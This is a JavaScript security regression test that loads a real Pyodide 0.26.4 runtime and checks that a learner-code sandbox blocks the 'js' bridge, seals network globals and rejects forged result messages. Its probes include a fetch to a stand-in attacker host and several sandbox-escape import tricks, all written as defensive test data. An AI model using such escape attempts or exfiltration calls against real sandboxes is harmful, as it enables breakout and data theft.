/* Security regression against a REAL Pyodide 0.26.4.

   Why this file exists
   --------------------
   scripts/test-exercise-worker.cjs drives the worker's Python half through a
   FAKE loadPyodide. That is the right way to test grading logic — it is fast
   and it is hermetic — but it cannot see anything about the runtime itself.
   Two Critical defects were invisible to it, and structurally invisible:

     * the vendor tree was missing pyodide.asm.js, so every first run died
       before a line of learner code ran (the fake never loads a file);
     * `import js` reached the JavaScript globals, so learner code could
       fetch(), eval() and postMessage() out of the sandbox (the fake has no
       js module, so there was nothing to escape to).

   Both read as "all 26 tests pass" from the fake. This file loads the real
   vendored runtime and asks the questions the fake cannot.

   What it asserts
   ---------------
     1. `import js` raises ImportError, and js.fetch / js.eval / js.postMessage
        are unreachable — by any import route, including tampering.
     2. After the boot, the worker's network globals are sealed: fetch,
        XMLHttpRequest, WebSocket and importScripts all throw.
     3. A forged postMessage (no valid nonce) is discarded by the facade.
     4. Ordinary exercises still pass every check kind, on the real runtime.

   Runtime
   -------
   Loads ~13 MB of wasm and compiles it, which takes a few seconds locally and
   a bit longer on a loaded CI machine. Set SILS_REAL_PYODIDE=0 to skip it.

   Usage:  node scripts/test-exercise-sandbox-real.cjs
*/
'use strict';
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const vm = require('node:vm');
const { spawnSync } = require('node:child_process');

const ROOT = path.resolve(__dirname, '..');
const WORKER = path.join(ROOT, 'assets/exercise-worker.js');
const SANDBOX = path.join(ROOT, 'assets/exercise-sandbox.js');
const VENDOR = path.join(ROOT, 'assets/vendor/pyodide');
const VENV_PYTHON = path.join(ROOT, '.venv/Scripts/python.exe');
const PYTHON = process.env.PYTHON || (fs.existsSync(VENV_PYTHON) ? VENV_PYTHON : 'python');

/* The worker, running for real.

   The worker cannot run in node (no Worker, and importScripts has to be
   supplied), so its real source is loaded into a vm context with a scope that
   stands in for a WorkerGlobalScope. Nothing is copied out of the worker, so a
   defect in the shipped file fails here.

   Two things about that scope matter:

     * `loadPyodide` is the GENUINE vendored loader and returns a genuine
       runtime, so the seal and the escape probes run against real Pyodide.
     * the scope really does have fetch / XMLHttpRequest / WebSocket /
       importScripts on it before the worker seals them. Without a global that
       genuinely had them, the network assertions would be checking that a
       property was never there. */
function createRealHost() {
  const source = fs.readFileSync(WORKER, 'utf8');
  let handler = null;
  const replies = [];
  const imported = [];
  let runtime = null;

  // The genuine vendored loader and a genuine runtime. Required rather than
  // reached through the scope's importScripts, because pyodide.js is a UMD
  // bundle that wants node:fs and friends; requiring it puts it in the realm
  // where those exist. The file is still the one that ships, unmodified.
  const pyodideModule = require(path.join(VENDOR, 'pyodide.js'));

  const scope = {
    addEventListener(type, listener) { if (type === 'message') handler = listener; },
    postMessage(message) { replies.push(message); },
    fetch(...args) { scope.fetchCalled = true; return globalThis.fetch(...args); },
    XMLHttpRequest: class { constructor() { scope.xhrUsed = true; } },
    WebSocket: class { constructor() { scope.wsUsed = true; } },
    EventSource: class { },
    // Recorded rather than executed: the loader is required above. The URL is
    // still asserted, because getting it wrong is how the runtime fails to
    // find its own files in a browser.
    importScripts(url) { imported.push(url); },
  };

  const context = {
    self: scope,
    importScripts: url => scope.importScripts(url),
    // Async because the real loadPyodide is: the worker awaits it, and the
    // host has to hold the resolved instance, not the pending promise.
    async loadPyodide(options) {
      const given = (options && options.indexURL) || './vendor/pyodide/';
      const indexURL = path.isAbsolute(given) ? given : path.join(VENDOR, path.sep);
      runtime = await pyodideModule.loadPyodide(Object.assign({}, options, { indexURL }));
      return runtime;
    },
    crypto: globalThis.crypto,
    console,
  };
  context.globalThis = context;
  vm.createContext(context);
  vm.runInContext(source, context, { filename: 'assets/exercise-worker.js' });

  return {
    scope,
    imported,
    get runtime() { return runtime; },
    async run(request) {
      const nonce = request.nonce || 'real-nonce';
      replies.length = 0;
      await handler({ data: Object.assign({ type: 'run', nonce }, request) });
      const result = replies.find(one => one.type === 'result');
      assert.ok(result, 'the worker must answer with a result');
      assert.equal(result.nonce, nonce, 'the worker must echo the nonce it was given');
      return { result, notices: replies.filter(one => one.type === 'loading') };
    },
  };
}

/* The facade, with a Worker stand-in that routes replies through the REAL
   worker, so the nonce check is exercised against genuine worker output rather
   than a hand-written message. */
function createFacade(realHost) {
  class Worker {
    constructor() { this.listeners = new Map(); this.terminated = false; Worker.last = this; }
    addEventListener(type, listener) {
      if (!this.listeners.has(type)) this.listeners.set(type, []);
      this.listeners.get(type).push(listener);
    }
    removeEventListener(type, listener) {
      this.listeners.set(type, (this.listeners.get(type) || []).filter(one => one !== listener));
    }
    async postMessage(data) {
      this.sent = data;
      const { result, notices } = await realHost.run(data);
      for (const notice of notices) this.emit('message', { data: notice });
      this.emit('message', { data: result });
    }
    terminate() { this.terminated = true; }
    emit(type, event) { for (const listener of (this.listeners.get(type) || [])) listener(event); }
    /* Delivers a message the worker did NOT produce — the forgery route. */
    forge(message) { this.emit('message', { data: message }); }
  }
  const module = { exports: {} };
  const context = {
    module, exports: module.exports, Worker, setTimeout, clearTimeout,
    crypto: globalThis.crypto,
  };
  vm.createContext(context);
  vm.runInContext(fs.readFileSync(SANDBOX, 'utf8'), context, { filename: 'assets/exercise-sandbox.js' });
  return { api: module.exports, Worker };
}

/* Runs a snippet on the real runtime and reports how it ended. */
function tryPython(runtime, code) {
  try {
    const value = runtime.runPython(code);
    return { ok: true, value: String(value === undefined ? '' : value) };
  } catch (error) {
    return { ok: false, error: String(error && error.message || error) };
  }
}

const CASES = [];
const caseOf = (name, fn) => CASES.push([name, fn]);

/* ---------------------------------------------------------------- probes -- */

caseOf('the vendored runtime actually boots from the repository', async host => {
  assert.ok(fs.existsSync(path.join(VENDOR, 'pyodide.asm.js')),
    'pyodide.asm.js must be vendored or nothing here can run');
  await host.run({ code: 'pass\n', checks: [] });
  assert.equal(host.runtime.version, '0.26.4');
  assert.deepEqual(host.imported, ['./vendor/pyodide/pyodide.js']);
});

caseOf('import js raises ImportError on the real runtime', async host => {
  await host.run({ code: 'pass\n', checks: [] });
  const outcome = tryPython(host.runtime, 'import js');
  assert.equal(outcome.ok, false, 'import js must not succeed');
  assert.match(outcome.error, /ImportError/,
    `expected an ImportError, got: ${String(outcome.error || '').slice(-160)}`);
});

caseOf('js.fetch, js.eval and js.postMessage are all unreachable', async host => {
  await host.run({ code: 'pass\n', checks: [] });
  for (const attempt of [
    ['js.fetch', 'import js\njs.fetch("https://attacker.example/collect")'],
    ['js.eval', 'import js\njs.eval("1+1")'],
    ['js.postMessage', 'import js\njs.postMessage({"type":"result"})'],
    ['from js import eval', 'from js import eval'],
    ['js in a function', 'def go():\n    import js\n    return js\ngo()'],
    ['importlib.import_module("js")', 'import importlib\nimportlib.import_module("js")'],
    ['__import__("js")', '__import__("js")'],
    ['pyodide_js', 'import pyodide_js'],
    ['pyodide.code.eval_js', 'from pyodide.code import eval_js'],
  ]) {
    const outcome = tryPython(host.runtime, attempt[1]);
    assert.equal(outcome.ok, false, `${attempt[0]} must not be reachable`);
  }
});

caseOf('tampering with sys.meta_path does not reopen the bridge', async host => {
  await host.run({ code: 'pass\n', checks: [] });
  // A plain sys.meta_path finder would be walked straight past by any of these.
  for (const attempt of [
    ['clear meta_path', 'import sys\nsys.meta_path.clear()\nimport js'],
    ['replace meta_path', 'import sys\nsys.meta_path = []\nimport js'],
    ['read sys.modules directly', 'import sys\nsys.modules["js"]'],
  ]) {
    const outcome = tryPython(host.runtime, attempt[1]);
    assert.equal(outcome.ok, false, `${attempt[0]} must not yield the js module`);
  }
  // And the seal must be re-armed for the NEXT run, not just the current one.
  const second = await host.run({ code: 'import sys\nsys.meta_path.clear()\n', checks: [] });
  assert.equal(second.result.ok, true, 'tampering itself is legal learner code');
  assert.equal(tryPython(host.runtime, 'import js').ok, false,
    'the next run must still be sealed');
});

caseOf('the network globals are sealed after the runtime boots', async host => {
  await host.run({ code: 'pass\n', checks: [] });
  // Each of these was a working global before the seal; a scope that never had
  // them would make this case pass for the wrong reason.
  for (const name of ['fetch', 'XMLHttpRequest', 'WebSocket', 'importScripts']) {
    assert.equal(typeof host.scope[name], 'function', `${name} must still be a function`);
    assert.throws(() => host.scope[name]('https://attacker.example/x'), /disabled inside the exercise sandbox/,
      `${name} must refuse to work once the runtime is up`);
  }
  assert.equal(host.scope.fetchCalled, undefined, 'sealing fetch must stop it reaching the network');
  assert.equal(host.scope.xhrUsed, undefined, 'XMLHttpRequest must not have been constructed');
  assert.equal(host.scope.wsUsed, undefined, 'WebSocket must not have been constructed');
});

caseOf('the seal does not break ordinary Python', async host => {
  const { result } = await host.run({
    code: 'name = "Ada"\nprint(f"I am {name}")\n',
    checks: [{ kind: 'stdout_contains', value: 'I am Ada', weight: 1 }],
  });
  assert.equal(result.ok, true);
  assert.equal(result.stdout, 'I am Ada\n');
  // Every module here ships in Pyodide's own stdlib; `statistics`, `ssl` and
  // `sqlite3` are deliberately absent from it upstream, so they are not in this
  // list and must not be mistaken for seal damage.
  for (const snippet of [
    'import json; json.dumps({"a": 1})',
    'import math, re, string, random, itertools, functools, operator',
    'import collections; collections.Counter("aab").most_common()',
    'import csv, io; list(csv.reader(io.StringIO("a,b")))',
    'import textwrap; textwrap.shorten("a b c d", 5)',
    'import unicodedata; unicodedata.name("A")',
    'import datetime; datetime.datetime.now().year > 2000',
    'import fractions, decimal; str(fractions.Fraction(1, 3))',
    'import heapq, bisect, copy, pprint; bisect.bisect_left([1, 2, 3], 2)',
    'import enum, abc, dataclasses, typing; dataclasses.make_dataclass',
    'open("/tmp/sandbox-probe", "w").write("hi")',
  ]) {
    const outcome = tryPython(host.runtime, snippet);
    assert.equal(outcome.ok, true,
      `the seal broke \`${snippet}\`:\n${String(outcome.error || 'no error text')}`);
  }
});

caseOf('wiping sys.meta_path does not break the session afterwards', async host => {
  // A seal that rebuilt itself from the CURRENT meta_path would, after learner
  // code ran `sys.meta_path = []`, end up with a sealed list holding only the
  // guard: every pure-Python stdlib import would fail for the rest of the
  // session, with no way for the learner to tell why.
  await host.run({ code: 'import sys\nsys.meta_path = []\n', checks: [] });
  const outcome = tryPython(host.runtime, 'import collections; collections.Counter("ab").most_common()');
  assert.equal(outcome.ok, true,
    `the import system must recover from a wiped meta_path: ${String(outcome.error || '').split('\n').slice(-1)[0]}`);
  assert.equal(tryPython(host.runtime, 'import js').ok, false, 'and must still be sealed');
});

/* -------------------------------------------------------------- the facade -- */

caseOf('a forged postMessage is discarded by the facade', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  const checks = [{ kind: 'assert_python', code: 'assert False', weight: 1 }];
  const settled = sandbox.run({ code: 'x = 1\n', checks });

  // Wait for the run to actually be in flight, then forge.
  const posted = await new Promise(resolve => {
    const tick = () => (box.Worker.last ? resolve(box.Worker.last) : setTimeout(tick, 5));
    tick();
  });
  assert.ok(posted.sent, 'the facade must have posted a run');
  const nonce = posted.sent.nonce;

  // Exactly the message unhardened learner code could send through
  // `js.postMessage`: a perfect result, no nonce.
  posted.forge({
    type: 'result', ok: true, stdout: '', values: {},
    outcomes: checks.map(() => ({ ok: true, detail: '' })),
  });
  // ...and a near-miss with the right shape but the wrong nonce.
  posted.forge({
    type: 'result', nonce: 'deadbeef', ok: true, stdout: '',
    values: {}, outcomes: checks.map(() => ({ ok: true, detail: '' })),
  });

  const result = await settled;
  assert.equal(result.ok, true, 'the real run should succeed');
  assert.equal(result.outcomes.length, checks.length);
  assert.equal(result.outcomes[0].ok, false,
    'the forged "all passed" outcome must not have been believed');
});

caseOf('a real run passes every check kind on the real runtime', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  const result = await sandbox.run({
    code: 'name = "Ada"\nrole = "Agent"\nscore = 7\nprint(f"I am {name}, I want to learn {role}")\n',
    checks: [
      { kind: 'stdout_matches', pattern: 'I am [\\s\\S]{1,20},\\s*I want to learn\\s*[^\\s]', weight: 6 },
      { kind: 'assert_python', code: 'assert isinstance(name, str) and name.strip()', weight: 2 },
      { kind: 'var_equals', name: 'name', value: 'Ada', weight: 2 },
      { kind: 'var_in_range', name: 'score', min: 5, max: 10, weight: 1 },
      { kind: 'stdout_contains', value: 'I am Ada', weight: 3 },
      { kind: 'output_choice', correct: ['A', 'B'], weight: 1 },
    ],
    answer: ['A', 'B'],
  });
  assert.equal(result.ok, true, `the exercise failed: ${result.error}`);
  assert.deepEqual(result.outcomes.map(one => one.ok), [true, true, true, true, true, true]);
  assert.deepEqual(result.values.name, 'Ada');
  assert.deepEqual(result.values.score, 7);
});

caseOf('a crash inside learner code is reported, not swallowed', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  const result = await sandbox.run({
    code: 'print("before")\nraise ValueError("boom")\n',
    checks: [{ kind: 'stdout_contains', value: 'before', weight: 1 }],
  });
  assert.equal(result.ok, false);
  assert.match(result.error, /ValueError: boom/);
  assert.equal(result.stdout, 'before\n');
});

caseOf('a stale global does not survive into the next run on the real runtime', async host => {
  const box = createFacade(host);
  const sandbox = box.api.create({});
  await sandbox.run({ code: 'total = 5\n_secret = 9\n', checks: [] });
  const second = await sandbox.run({
    code: 'pass\n',
    checks: [
      { kind: 'var_equals', name: 'total', value: 5, weight: 1 },
      { kind: 'var_equals', name: '_secret', value: 9, weight: 1 },
    ],
  });
  assert.deepEqual(second.outcomes.map(one => one.ok), [false, false],
    'nothing from the previous run may satisfy this run');
});

/* ------------------------------------------------------------------ corpus -- */

caseOf('every corpus reference scores the same on the real runtime', async host => {
  const items = pythonCorpus();
  assert.ok(items.length >= 9, `expected the frozen corpus, found ${items.length}`);
  for (const entry of items) {
    const { item, where } = entry;
    const { result } = await host.run({ code: item.reference || '', checks: item.checks || [] });
    assert.equal(result.outcomes.length, (item.checks || []).length,
      `${where}: outcomes must stay aligned with checks`);
    if (result.ok) continue;  // the harness rejects non-standalone references anyway
    for (const [index, one] of result.outcomes.entries()) {
      if (['assert_python', 'var_equals', 'var_in_range'].includes(item.checks[index].kind)) {
        assert.equal(one.ok, false, `${where}: a crashed run must score zero on a sandbox check`);
      }
    }
  }
});

/* The corpus, read through the same loader scripts/check_exercise_references.py
   uses, so this test and the harness can never drift onto different data. */
function pythonCorpus() {
  const probe = `
import json, sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.argv[1]).resolve()))
import check_exercise_references as H
items = []
for lang, where, item in H.executable_items():
    if item['type'] not in H.EXECUTABLE_TYPES:
        continue
    items.append({'where': where, 'item': {k: item.get(k) for k in ('id', 'type', 'checks', 'reference')}})
print(json.dumps(items))
`;
  const run = spawnSync(PYTHON, ['-X', 'utf8', '-c', probe, path.join(ROOT, 'scripts')], {
    encoding: 'utf8', maxBuffer: 64 * 1024 * 1024,
  });
  if (run.status !== 0) throw new Error(`corpus probe failed: ${String(run.stderr || '').trim()}`);
  return JSON.parse(run.stdout);
}

/* -------------------------------------------------------------------- main -- */

async function main() {
  if (process.env.SILS_REAL_PYODIDE === '0') {
    console.log('ExerciseSandboxReal\n  skip  SILS_REAL_PYODIDE=0');
    console.log('\nSKIP: real Pyodide checks were not run');
    return;
  }
  console.log('ExerciseSandboxReal');
  let failures = 0;
  // ONE host for the whole run: booting the runtime is the expensive part, and
  // sharing it means each case inherits the state the previous one left, which
  // is what a real long-lived worker does.
  const host = createRealHost();

  for (const [name, fn] of CASES) {
    try {
      await fn(host);
      console.log(`  ok  ${name}`);
    } catch (error) {
      failures += 1;
      console.error(`  FAIL ${name}\n       ${error.message}`);
    }
  }
  if (failures) {
    console.error(`\n${failures} failing`);
    process.exit(1);
  }
  console.log('\nPASS: the sandbox holds against a real Pyodide runtime');
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
